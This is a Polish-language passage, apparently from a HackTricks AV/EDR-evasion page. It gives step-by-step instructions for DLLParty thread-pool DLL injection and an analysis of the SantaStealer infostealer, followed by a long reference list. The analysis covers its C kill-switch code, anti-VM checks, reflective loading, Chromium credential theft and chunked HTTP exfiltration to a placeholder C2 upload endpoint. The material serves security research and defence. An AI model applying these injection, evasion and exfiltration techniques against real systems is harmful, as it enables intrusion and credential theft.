3. Zapisz ścieżkę DLL we **wszystkich** odzyskanych slotach workerów, ponieważ umieszczone w kolejce ukończenie może zostać obsłużone przez dowolny worker. Umieść `TP_DIRECT` z `Callback = LoadLibraryA` w zapisywalnej pamięci procesu docelowego. PoC używa `last_slot-0x500` na stosie workera zamiast `VirtualAllocEx`; ten offset jest eksperymentalny i nie może kolidować z aktywnymi danymi na stosie.
4. Zduplikuj uchwyt portu ukończenia procesu docelowego i wywołaj `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Zdalny adres `TP_DIRECT` jest kluczem ukończenia. Istniejący worker wywoła wtedy `LoadLibraryA` z nadpisanym wskaźnikiem instancji callbacku, ładując DLL dostępną dla procesu docelowego.

PoC przyjmuje PID procesu docelowego (`DLLParty.exe <target_pid>`) i używa ścieżki DLL zapisanej na stałe w `DLLParty.cpp`; przed zbudowaniem pliku wykonywalnego x64 ustaw ścieżkę dostępną dla procesu docelowego. PoC używa też adresu `LoadLibraryA` z własnego procesu jako zdalnego callbacku, zakładając, że ten adres jest prawidłowy w procesie docelowym. Kod nie sprawdza, czy długość ścieżki mieści się w prefiksie o długości 0x58 bajtów ani czy przechodzenie po workerach znalazło slot przed odwołaniem się do ostatniego elementu. Zweryfikuj ponownie prywatne offsety, układ stosu i dostępne miejsce do zapisu dla docelowej kompilacji. Pominięcie `CreateRemoteThreadEx`, shellcode i `VirtualAllocEx` nie eliminuje zapisów między procesami ani telemetrii ładowania DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Taktyki SantaStealer służące bezplikowemu unikaniu wykrycia i kradzieży danych uwierzytelniających

SantaStealer (znany też jako BluelineStealer) pokazuje, jak współczesne info-stealery łączą omijanie AV, techniki antyanalityczne i kradzież danych uwierzytelniających w jednym workflow.<sup>[[24]](#references)</sup>

### Weryfikacja układu klawiatury i opóźnianie działania w sandboxie

- Flaga konfiguracji (`anti_cis`) wylicza zainstalowane układy klawiatury za pomocą `GetKeyboardLayoutList`. Jeśli znajdzie układ cyrylicki, próbka tworzy pusty znacznik `CIS` i kończy działanie przed uruchomieniem stealerów, dzięki czemu nie aktywuje się w wykluczonych lokalizacjach, a jednocześnie pozostawia artefakt do wyszukiwania.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Warstwowa logika `check_antivm`

- Wariant A przechodzi przez listę procesów, hashuje każdą nazwę za pomocą niestandardowej sumy kontrolnej z przesunięciami i porównuje ją z osadzonymi listami blokowanych nazw debuggerów/sandboxów; powtarza obliczanie sumy kontrolnej dla nazwy komputera i sprawdza katalogi robocze, takie jak `C:\analysis`.
- Wariant B sprawdza właściwości systemu (minimalną liczbę procesów, niedawny czas działania), wywołuje `OpenServiceA("VBoxGuest")`, aby wykryć dodatki VirtualBox, i mierzy czas wokół uśpienia, by wykryć wykonywanie krokowe. Każde wykrycie przerywa działanie przed uruchomieniem modułów.

### Fileless helper + podwójne reflective loading ChaCha20

- Główna DLL/EXE zawiera helper Chromium do pobierania danych uwierzytelniających, który jest zapisywany na dysku albo ręcznie mapowany w pamięci; w trybie fileless samodzielnie rozwiązuje importy/relokacje, więc żadne pliki pomocnicze nie są zapisywane.
- Ten helper przechowuje DLL drugiego etapu, dwukrotnie zaszyfrowaną algorytmem ChaCha20 (dwa klucze 32-bajtowe + 12-bajtowe nonce). Po obu etapach odszyfrowywania ładuje blob przez reflective loading (bez `LoadLibrary`) i wywołuje eksporty `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` pochodzące z [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Procedury ChromElevator używają bezpośrednich wywołań systemowych i reflective process hollowing, aby wstrzyknąć kod do działającej przeglądarki Chromium, przejąć klucze AppBound Encryption i odszyfrować hasła/pliki cookie/dane kart kredytowych bezpośrednio z baz SQLite, mimo zabezpieczeń ABE.

### Modułowe gromadzenie danych w pamięci i eksfiltracja HTTP w porcjach

- `create_memory_based_log` przechodzi przez globalną tabelę wskaźników funkcji `memory_generators` i uruchamia po jednym wątku dla każdego włączonego modułu (Telegram, Discord, Steam, zrzuty ekranu, dokumenty, rozszerzenia przeglądarki itp.). Każdy wątek zapisuje wyniki do współdzielonych buforów i po około 45-sekundowym oczekiwaniu na zakończenie zgłasza liczbę plików.
- Po zakończeniu wszystkie dane są pakowane do archiwum przy użyciu statycznie dołączonej biblioteki `miniz` jako `%TEMP%\\Log.zip`. Następnie `ThreadPayload1` czeka 15 sekund i przesyła archiwum strumieniowo w porcjach po 10 MB za pomocą HTTP POST na `http://<C2>:6767/upload`, podszywając się pod granicę `multipart/form-data` przeglądarki (`----WebKitFormBoundary***`). Do każdej porcji dodawane są nagłówki `User-Agent: upload`, `auth: <build_id>` i opcjonalnie `w: <campaign_tag>`, a w ostatniej porcji dodawane jest `complete: true`, aby C2 wiedział, że scalanie danych zostało zakończone.

## References

- [1] [Zaawansowane techniki unikania wykrycia: precyzyjne podmienianie modułów](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Stosy wywołań: koniec z darmową przepustką dla malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – dokumentacja](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – przykład](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – przykład](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC do fałszowania stosu wywołań](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nowy łańcuch infekcji i zaciemnianie oparte na ConfuserEx w DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Czy można ufać modelowi zero trust? Omijanie kontroli stanu urządzeń Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Przed ToolShell: analiza wcześniejszych operacji ransomware grupy Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: nadużywanie przekazywanych eksportów](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Spis przekazywanych eksportów w Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Kolejność wyszukiwania bibliotek DLL](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Zabezpieczenia procesów i prawa dostępu](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Dokumentacja EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Uruchamiacz CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Odpieranie ataków na EDR-y dzięki ochronie Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Przełamywanie ochrony Windows Defender za pomocą techniki przekierowania folderu](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Dokumentacja polecenia mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Za czystą kurtyną: od RAT-a przez builder do kodera](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer nadchodzi: nowy, ambitny infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – odszyfrowywanie Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: zwalczanie malware Node.js za pomocą śledzenia API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Śpiąca królewna: usypianie Adaptix za pomocą Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Zatruwanie parametrów procesu](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Śpiąca królewna II: CFG, CET i fałszowanie stosu](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Zaciemnianie uśpienia Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Ukrywanie Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Nadużywanie Chrome Remote Desktop w operacjach Red Team: praktyczny przewodnik](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: wykorzystanie sterownika naprawczego Defendera jako prymitywu do operacji na jądrze](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Kod towarzyszący MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: tworzenie funkcji samomaskujących za pomocą LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - kod źródłowy InjectSetConsole](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Funkcja CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Tworzenie procesu potomnego z przekierowanym wejściem i wyjściem](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: odtwarzanie narzędzi C# za pomocą WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - kompilowanie projektów C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [Proof of concept i kod źródłowy DLLParty](https://github.com/epersic/DLLParty)
- [47] [DLLParty — nadużywanie wewnętrznych mechanizmów puli wątków do wstrzykiwania DLL bez shellcode'u](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [Zbiór danych benchmarkowych EMBER2024 i narzędzia thrember](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Wykorzystanie EMBER2024 do oceny implantów Red Team](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Unikanie wykrywania opartego na uczeniu maszynowym](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – oparty na XAML framework ładowania .NET NetamLoader](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – wyliczenie AMSI_RESULT](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – metoda IAntimalware::Scan](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
- [54] [Zscaler ThreatLabz - analiza techniczna 2CLoader](https://zscaler.com/blogs/security-research/2cloader-new-malware-loader-delivering-vidar-and-remus)
- [55] [Przegląd tprtdll-Injection i spis eksportów](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/README.md)
- [56] [Proof of concept samowstrzykiwania Trusted-twin](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/trustedtwin_self.cpp)
- [57] [Proof of concept wstrzykiwania międzyprocesowego Trusted-twin](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/trustedtwin_cross.cpp)
{{#include ../banners/hacktricks-training.md}}
